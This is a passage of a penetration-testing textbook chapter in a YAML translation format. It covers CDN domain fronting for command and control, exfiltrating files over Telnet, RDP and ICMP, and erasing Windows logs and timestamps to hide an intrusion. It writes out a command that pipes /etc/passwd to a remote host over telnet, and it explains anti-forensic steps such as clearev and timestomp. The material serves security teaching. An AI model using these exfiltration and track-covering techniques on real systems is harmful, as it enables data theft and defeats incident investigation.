- en: Attackers may choose to utilize Microsoft CDN services for C2\. Unfortunately,
    the CDN options are not available for free-tier users; hence users may have to
    register with the pay-as-you-go option and then create a subscription and follow
    the instructions at [https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to](https://docs.microsoft.com/en-us/azure/cdn/cdn-create-endpoint-how-to).
    However, testers need to ensure that the domain name behind either Azure or Amazon
    has a valid A record. For Microsoft Azure, you also need to ensure that the CNAME
    is pointed to the right custom domain to make domain fronting work.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
- en: Although many content providers are vulnerable to this type of attack, some
    of the content providers, such as Google, seem to have quickly fixed this attack
    by making major changes to their cloud infrastructure. For example, if Company
    A’s domain uses Amazon’s domain as a front, with an additional host header pointing
    to Company B, the request will be dropped at the first node of the CDN.
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
- en: Similarly, other providers are trying to block these forward or fronting techniques
    by requiring an additional authorization token or another mechanism.
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
- en: Exfiltration of data
  id: totrans-242
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The unauthorized transfer of digital data from any environment is known as the
    exfiltration of data (or the extrusion of data). Once persistence is maintained
    on a compromised system, a set of tools can be utilized to exfiltrate data from
    highly secure environments.
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
- en: In this section, we will explore different methods that attackers utilize to
    send files from internal networks to attacker-controlled systems.
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
- en: Using existing system services (Telnet, RDP, and VNC)
  id: totrans-245
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Firstly, we will discuss some straightforward techniques for quickly grabbing
    files when access to compromised systems is time-limited. Attackers can simply
    open up a port using Netcat by running `nc -lvp 2323 > Exfilteredfile`, and then
    run `cat /etc/passwd | telnet remoteIP 8000` from the compromised Linux server.
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
- en: 'This will display the entire contents of `etc/passwd` to the remote host. As
    an example, we are extracting a password list from the internal host to a remote
    Kali machine on AWS, as seen in *Figure 13.35*:'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_35.png)'
  id: totrans-248
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.35: Exfiltration of data from a local Kali system to a remote Kali
    system using Telnet'
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
- en: Another important and fairly simple technique used by attackers with access
    to any system on the network is to run `getgui` from the Meterpreter shell, which
    will enable the RDP. Once the RDP is enabled, attackers can configure their Windows
    attack to mount the local drive to the remote drive and exfiltrate all the files
    from the remote desktop to the local drive.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
- en: 'This can be achieved by going to **Remote Desktop Connection** and selecting
    **Show Options**, then **Local Resources**, then **Local devices and resources**,
    clicking **More**, and finally selecting the drive that you want to mount, as
    shown in *Figure 13.36*:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_36.png)'
  id: totrans-252
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.36: Options in RDP settings to mount the drives'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
- en: 'This will mount the `D://` drive of the attacker’s local machine to the RDP
    system. This can be confirmed by logging in to the remote IP using the RDP connection.
    An additional drive (`X:`) should be mounted by default, as shown in *Figure 13.37*:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_37.png)'
  id: totrans-255
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.37: Successfully mounting the attacker’s local drive to the remote
    desktop'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
- en: Other traditional techniques involve setting up an SMB server and allowing anonymous
    access from compromised computers, or utilizing applications such as TeamViewer,
    the Skype Chrome plugin, Dropbox, Google Drive, OneDrive, WeTransfer, or any other
    one-click sharing service for bulk file transfers.
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
- en: Using the ICMP protocol
  id: totrans-258
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: There are multiple ways to utilize the ICMP protocol to exfiltrate files, using
    tools such as `hping`, `nping`, and `ping`. In this section, we will utilize the
    `nping` utility to perform the data exfiltration of confidential documents using
    the ICMP protocol.
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
- en: 'In this example, we will use `tcpdump` to extract the data from the `pcap`
    dump file. Run the following command in the terminal to enable the listener:'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  id: totrans-261
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: 'Attackers should be able to see the following:'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_38.png)'
  id: totrans-263
  prefs: []
  type: TYPE_IMG
- en: Figure 13.38 Capturing the packets to receive contents
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
- en: '`10.10.10.12` is the target host that we are waiting to receive data from.
    On the sender’s side, once `hping3` is fired at the client side (`10.10.10.12`),
    you should receive the message `EOF reached, wait some second than press ctrl+c`,
    as shown in *Figure 13.39*. This indicates that the file has been exfiltrated
    to the target server via ICMP:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_39.png)'
  id: totrans-266
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.39: Sending the file over the ICMP using the hping3 utility'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
- en: Close `tcpdump` using *Ctrl* + *C*. The next step is to remove the unwanted
    data from the `pcap` file so that we print only the specific hex value to a text
    file by running Wireshark or `tshark`.
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
- en: 'The following is the `tshark` command to filter the data fields and print just
    the hex value from the `pcap` file:'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  id: totrans-270
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: 'The same hex file can now be converted with the following one-line bash command
    by running `cat extfilterated_hex.txt | xxd –r –p`. Finally, you should be able
    to view the file contents, as shown in *Figure 13.40*:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_40.png)'
  id: totrans-272
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.40: Extraction of hex data from pcap and decoding using xxd'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
- en: These techniques are being eased out by other sets of tools, such as utilizing
    TeamViewer, DropBox, and other cloud-hosting services.
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
- en: Hiding evidence of an attack
  id: totrans-275
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Once a system has been exploited, the attacker must cover their tracks to avoid
    detection, or at least make reconstruction of the event more difficult for the
    defender.
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
- en: 'An attacker may completely delete the Windows event logs (if they are being
    actively retained on the compromised server). This can be done via a command shell
    to the system, using the following command:'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  id: totrans-278
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: The command directs all of the logs to be deleted (`/a`), including all files
    from subfolders (`/s`). The `/q` option disables all of the queries, asking for
    a `yes` or `no` response, and the `/f` option forcibly removes the files, making
    recovery more difficult.
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
- en: To wipe out specific recorded files, attackers must keep track of all the activities
    that have been performed on the compromised system.
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
- en: 'This can also be done from the Meterpreter prompt by using `clearev`. As shown
    in *Figure 13.41*, this will clear the application, system, and security logs
    from the target (there are no options or arguments for this command):'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_41.png)'
  id: totrans-282
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.41: Clearing the Event Logs in Windows'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
- en: Ordinarily, deleting a system log does not trigger any alerts to the user. In
    fact, most organizations configure logging so haphazardly that missing system
    logs are treated as a possible occurrence, and their loss is not investigated
    thoroughly.
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
- en: Apart from the traditional logs, attackers might also consider removing the
    `PowerShell Operational log` from the victim systems.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
- en: 'Metasploit has an additional trick up its sleeve: the `timestomp` option allows
    an attacker to make changes to the MACE parameters of a file (the last modified,
    accessed, created, and MFT entry modified times of a file). Once a system has
    been compromised and a Meterpreter shell established, `timestomp` can be invoked,
    as shown in *Figure 13.42*:'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_42.png)'
  id: totrans-287
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.42: Meterpreter timestomp options'
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
- en: 'For example, `C:` of the compromised system contains a file named `README.txt`.
    The MACE values for this file indicate that it was created recently, as shown
    in *Figure 13.43*:'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_43.png)'
  id: totrans-290
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.43: Running timestomp on a specific local file'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
- en: If we wanted to hide this file, we could move it to a cluttered directory, such
    as `Windows\System32`. However, the file would be obvious to anyone who sorted
    the contents of that directory on the basis of the creation dates or another MAC-based
    variable.
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
- en: 'Instead, you can change the timestamps of the file by running the following
    command:'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  id: totrans-294
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'This changes the timestamps of the `README.txt` file, as shown in *Figure 13.44*:'
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
- en: '![](../Images/B17765_13_44.png)'
  id: totrans-296
  prefs: []
  type: TYPE_IMG
- en: 'Figure 13.44: Modifying the metadata of the files to reflect false dates'
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
- en: 'In order to completely foul up an investigation, an attacker may recursively
    change all of the set times in a directory or on a particular drive using the
    following command:'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  id: totrans-299
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: The solution is not perfect. It is clear that an attack has occurred. Furthermore,
    timestamps can be retained in other locations on a hard drive and be accessible
    for investigation. If the target system is actively monitoring changes to system
    integrity using an intrusion detection system such as Tripwire, alerts of the
    timestomp activity will be generated. Therefore, destroying timestamps is of limited
    value when a truly stealthy approach is required.
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  id: totrans-301
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we took a journey into different strategies used by attackers
    to maintain access to compromised environments, including domain fronting to hide
    the origin of the attack, and we also learned how to hide the evidence of an attack
    to cover our tracks and remain anonymous, which is the last step of the cyber
    kill chain methodology.
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
- en: We looked at how to use Netcat, Meterpreter, scheduled tasks, PowerShell Empire’s
    dbx and onedrive modules, and Covenant C2 and Poshc2 implants to maintain persistent
    agents on compromised systems, as well as how to exfiltrate data using traditional
    services such as DNS, ICMP, Telnet, RDP, and Netcat. We also learned how to find
    vulnerable domain fronting domains and use them for malicious activities using
    well-known CDNs such as Amazon and Azure.
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
- en: In the next chapter, we will look at how to hack embedded and RFID/NFC devices
    using both existing Kali 2021.4 features and additional tools.
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
